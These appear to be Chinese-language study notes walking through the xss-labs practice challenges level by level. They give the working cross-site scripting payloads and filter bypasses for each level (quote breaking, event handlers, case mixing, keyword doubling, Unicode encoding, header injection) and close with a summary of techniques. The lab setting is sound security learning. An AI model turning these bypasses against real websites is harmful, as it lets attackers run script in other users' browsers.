1.第一关
直接使用url?name=<script>alert()</script>即可弹出弹窗，过关
2.第二关
特殊符号被实体化函数实体转义，可将属性的双引号闭合和标签闭合，执行
">  <script>alert()</script> 过关
.第三关
是单引号闭合，使用‘>  <script>alert()</script>发现不行，符号被实体化了
使用onfocus绕过<>的过滤，' onfocus=javascript:alert() ’即可过关
**这里只能用单引号不能用双引号，变成类似<input value="' onfocus=javascript:alert(1) '"> 因为这里使用了下面的这个实体转义函数，使得含"的代码无法执行，只能使用单引号**
htmlspecialchars() 函数
```python
htmlspecialchars()函数把预定义的字符转换为 HTML 实体
或者说就是把输入内容转成html实体
预定义的字符有：
 & （和号）成为 &amp;
 " （双引号）成为 &quot;
 ' （单引号）成为 '
 < （小于）成为 &lt;
 > （大于）成为 &gt;

```
4.第四关
onfocus的双引号闭合，使用**"onfocus=javascript:alert() "过关 这里只能用单引号不能用双引号，变成类似<input value="' onfocus=javascript:alert(1) '">**
**5.**第五关
使用" onfocus=javascript:alert() "发现不行，想使用大小写绕过发现有小写转换函数，也不行，on被转换成o_n
使用<a>标签的href属性"> <a href=javascript:alert()>xxx</a>绕过
6.第六关
随便输入看看过滤，试试大小写绕过，发现可以，可使用三种任意一种绕过
"> <sCript>alert()</sCript> 
" Onfocus=javascript:alert() "
"> <a hRef=javascript:alert()>x</a>
7.第七关
输入"> <a hRef=javascript:alert()>x</a>发现href和script被过滤删去，使用双写绕过"><a hrhrefef=javascscriptript:alert('xss')>aaa</a>过关
8.第八关
查看源码后发现过滤很多东西， input标签添加了html实体转化函数还把双引号也给实体化了， 添加了小写转化函数，还有过滤掉了src、data、onfocus、href、script、"（双引号）  
但a标签的href属性具有自动unicode解码的功能，因此可以把javascript:alert(1)进行unicode编码，通关
9.第九关
查看源码后发现要在传入参数匹配到http://，但是在其前面加上//将其注释掉，否则无法进行，也就是先放实体编码，后面放//http：//
其他的还是跟第八关一样，进行Unicode编码
10.第十关
查看源码发现接受了t_sort传递的参数，因此使用&传入t_sort的参数，输入
well done&t_sort="> <script>alert("hack")</script>//发现<>都被过滤了，因此使用能在<>里面使用的函数，如onfocus或者onclick等，传入&t_sort=" type="text"  onclick="alert()，然后加上type="text"使其显现出文本框，然后点击即可弹窗过关，这里不知道为什么onfocus不能放前面
11.第十一关
查看网页源码发现多了一个参数，看到ref和后面的网址猜想应该是refer头，使用harbar的refer头传入参数" type="text" onclick="alert('xss') 点击后即可通关
12.第十二关
和十一关差不多，是ua头
13.第十三关
是cookie，但要先找到cookie的名称，然后同样传入参数
14.第十四关
网页地址失效，无法跳转
15.第十五关
 ng-include指令，用于在当前html中包含另一个html文件
![image.png](./xss-labs通关.assert/1728277382673-bad2e7d2-f58b-465e-959b-945fa829bdd4.png)

src：所要包含的文件的地址
这里得先让第十六关包含第一关，然后使用第一关的参数实现绕过，就是 name参数，这里不知道为什么不能使用<script>标签，只能使用img，a等
16.第十六关
尝试简单绕过后发现空格，script，/都被过滤了，空格可以使用%0a和%0d绕过，然后直接使用单标签img
src=1 onerror=alert()即可绕过、
17.第十七关
在第二个参数arg02后面添加一个空格，浏览器会停止解析，把空格后面当成下一个属性的内容 所以直接使用 onclick=alert(1)
18.第十八关
跟第十七关一样
​
标签总结
1.直接传入参数没有限制的可以用<script>alert(1)</script>
2./ 斜杠被过滤一般使用单标签，比如img或者a标签
img 也会和src onerror结合起来使用，比如<img src=1 onerror=alert(2)>
这里因为src后面要接地址，1是无效地址，所以发生错误，触发alert函数
3.a标签的href属性会自动进行实体编码解密，可以进行编码绕过
 a标签还可以<a href="#" onclick="alert(1)">点我</a>进行弹窗
4.考虑标签属性的双写绕过，大小写绕过
5.iframe标签和a标签src属性差不多，都是对网址进行执行，不过iframe标签是双标签
